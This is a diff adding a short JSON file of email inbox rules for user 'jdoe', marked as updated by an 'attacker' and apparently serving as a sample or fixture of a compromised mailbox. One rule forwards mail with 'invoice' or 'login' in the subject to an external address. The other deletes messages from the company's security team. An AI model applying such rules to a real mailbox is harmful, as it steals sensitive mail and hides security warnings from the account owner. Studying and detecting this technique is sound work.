@@ -1,0 +1,35 @@
+{
+    "user": "jdoe",
+    "rules": [
+        {
+            "name": "AutoForwardToExternal",
+            "enabled": true,
+            "recipients": [
+                "external.hacker@mail.com"
+            ],
+            "conditions": {
+                "subjectContains": [
+                    "invoice",
+                    "login"
+                ]
+            },
+            "actions": [
+                "forwardTo"
+            ]
+        },
+        {
+            "name": "AutoDeleteSecurityWarnings",
+            "enabled": true,
+            "conditions": {
+                "from": [
+                    "security@zenithsolutions.co.uk"
+                ]
+            },
+            "actions": [
+                "delete"
+            ]
+        }
+    ],
+    "updated_by": "attacker",
+    "timestamp": "2025-04-01T11:32:00Z"
+}
